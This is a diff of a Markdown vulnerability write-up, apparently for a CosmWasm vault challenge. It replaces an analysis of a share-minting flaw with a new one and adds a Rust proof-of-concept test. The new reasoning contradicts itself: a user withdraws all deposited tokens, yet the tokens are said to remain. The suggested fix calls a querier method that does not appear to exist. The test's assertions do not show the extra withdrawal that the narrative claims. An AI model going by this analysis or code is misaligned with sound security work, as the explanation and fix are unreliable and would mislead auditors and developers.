@@ -275,44 +275,111 @@ let hacker = Addr::unchecked(HACKER.to_string());
 
 There is a vulnerability in the mint function. The vulnerability is related to how the `mint_amount` is calculated. This issue could potentially allow a user to withdraw more funds than they deposited.
 
-`let total_assets = contract_balance.amount - amount;`
-
 Let's consider the following steps:
 
-1. User A deposits 1 `uawesome` token.
-   The mint function will be called. Since the total_supply is zero, `mint_amount` is equal to the amount, which is 1. The `total_supply` is then updated to 1, and user A's balance is updated to 1.
+1. User A deposits 1000 uawesome, since the total supply is 0, they receive 1000 shares.
+2. User A burns all their shares and withdraws 1000 uawesome.
+3. Now the total supply is 0 but the contract still has 1000 uawesome left because of the burning process.
+4. User B deposits 1 uawesome, they should receive 1 share, but due to the current implementation of the mint method, they receive 1001 shares because the minting ratio is calculated based on the total assets left by user A (1000 uawesome) and the current deposit (1 uawesome).
+5. User B burns all their shares and theoretically they should receive only 1 uawesome, the amount they deposited. However, the current implementation of the burn method allows them to withdraw all the coins in the contract (1001 uawesome), which is more than they initially deposited.
 
-2. User B deposits 100 `uawesome` tokens.
-   When the mint function is called, `mint_amount` is calculated as `amount.multiply_ratio(total_supply, total_assets)`, which is `100.multiply_ratio(1, 1) = 100`. So the `total_supply` becomes 101, and user B's balance is updated to 100.
-
-3. User A withdraws their funds.
-   When user A calls the burn function, the `asset_to_return` is calculated as `shares.multiply_ratio(total_assets, total_supply)`, which is 1.`multiply_ratio(101, 101) = 1`.
-
-4. User B withdraws their funds.
-   When user B calls the burn function, the `asset_to_return` is calculated as `shares.multiply_ratio(total_assets, total_supply)`, which is 100.`multiply_ratio(1, 101)`. Here's the problem: despite depositing 100 tokens, user B can only withdraw approximately 0.99 tokens, losing a significant portion of their deposit.
-
-The vulnerability lies in the line where total_assets is calculated in the mint function:
-
-```rust
-let total_assets = contract_balance.amount - amount;
-```
-
-Here, `total_assets` is assigned the value of the contract's balance after the deposit, which doesn't reflect the actual total assets in the contract. This discrepancy in the calculation of `total_assets` affects the calculation of `mint_amount` and `asset_to_return`, leading to the problem described above.
+The vulnerability arises from the fact that when a user burns their shares, their coins aren't burned as well, so they are left in the contract. This allows a user who deposits later to potentially mint more shares than they should and consequently withdraw more coins than they deposited.
 
 ### Recommendation
 
-To fix this vulnerability, we should calculate total_assets before the new deposit is added:
+To fix this, you should adjust the burn method to also burn/withdraw the corresponding amount of coins from the contract. For example:
 
 ```rust
-let total_assets = contract_balance.amount;
-```
+let mut user = BALANCES.load(deps.storage, &info.sender)?;
+user.amount -= shares;
+BALANCES.save(deps.storage, &info.sender, &user)?;
 
-This will ensure that the `total_assets` variable correctly reflects the total assets in the contract when calculating the `mint_amount` and `asset_to_return`.
+let remaining_asset = contract_balance.amount - asset_to_return;
+deps.querier.update_balance(env.contract.address.to_string(), coins(remaining_asset.u128(), DENOM));
+
+let msg = BankMsg::Send {
+    to_address: info.sender.to_string(),
+    amount: coins(asset_to_return.u128(), DENOM),
+};
+```
 
 ### Proof of concept
 
 ```rust
-// code goes here
+#[test]
+    fn test_imbalance() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // User A deposits 10000 uawesome, since the total supply is 0, they receive 10000 shares.
+        // mint funds to user
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
+
+        // mint shares for user
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User A burns all their shares and withdraws 10000 uawesome.
+        // Now the total supply is 0 but the contract still has 10000 uawesome left because of the burning process.
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // User B deposits 1 uawesome, they should receive 1 share, but due to the current implementation of the mint method, they receive 10001 shares because the minting ratio is calculated based on the total assets left by user A (10000 uawesome) and the current deposit (1 uawesome).
+        // mint funds to user2
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(1));
+
+        // mint shares for user2
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(1, DENOM)],
+        )
+        .unwrap();
+
+        // burn shares for user2
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: Uint128::new(1),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // query user2
+        let balance: Balance = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::UserBalance {
+                    address: USER2.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(0));
+
+        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(1));
+
+        let bal = app
+            .wrap()
+            .query_balance(contract_addr.to_string(), DENOM)
+            .unwrap();
+        assert_eq!(bal.amount, Uint128::zero());
+    }
 ```
 
 ---
